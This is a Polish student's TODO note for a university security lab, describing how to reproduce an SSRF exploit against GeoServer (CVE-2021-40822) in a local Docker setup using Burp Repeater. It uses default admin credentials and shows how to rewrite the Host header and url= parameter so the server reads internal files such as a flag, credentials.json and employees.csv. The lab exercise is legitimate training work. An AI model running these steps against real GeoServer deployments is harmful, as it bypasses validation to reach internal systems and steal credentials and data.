# TODO — 2.3 przez Burp Suite (opcjonalne, do sprawozdania)

Atak SSRF z zad. 2.3 zrobiony przez `curl` (patrz `rozwiazanie.md`).
Do zrobienia później: **to samo przez Burp Repeater** (zrzuty „po GUI-owemu").

## Kroki

1. Uruchom środowisko (jeśli wyłączone):
   ```bash
   cd ~/Desktop/cyberbezpieczenstwo/lab5_2026-11-09
   sudo docker compose -f docker-compose-cve-2021-40822.yml up -d
   ```
2. Burp → **Proxy → Open Browser**. Wejdź na `http://127.0.0.1:8080/geoserver/web/`,
   zaloguj się (**admin / geoserver**).
3. Menu po lewej: **Demos → Demo Requests** → wybierz `WFS_getCapabilities-1.1.xml`
   → **Submit** (generuje `POST /geoserver/TestWfsPost`).
4. Burp → **Proxy → HTTP history** → znajdź `POST /geoserver/TestWfsPost`
   → prawy klik → **Send to Repeater**.
5. W **Repeaterze** zmień dwie rzeczy:
   - nagłówek **`Host:`** → `10.133.7.100:8888`
   - w ciele parametr **`url=`** → `http://10.133.7.100:8888/flag.txt`
6. **Send** → w panelu Response powinna pojawić się flaga:
   `FLAG{geoserver_ssrf_internal_access_achieved}`
7. (opcjonalnie) powtórz z `url=http://10.133.7.100:8888/credentials.json`
   oraz `.../employees.csv`.
8. Zrzut: (a) odrzucenie bez zmiany Host, (b) sukces po zmianie Host → dodać do notatki.

## Dlaczego Burp, nie sama przeglądarka
Przeglądarka ustawia `Host: 127.0.0.1:8080` automatycznie → serwlet odrzuca
niezgodny `url`. Burp (jak curl) pozwala nadpisać `Host`, co obchodzi walidację.
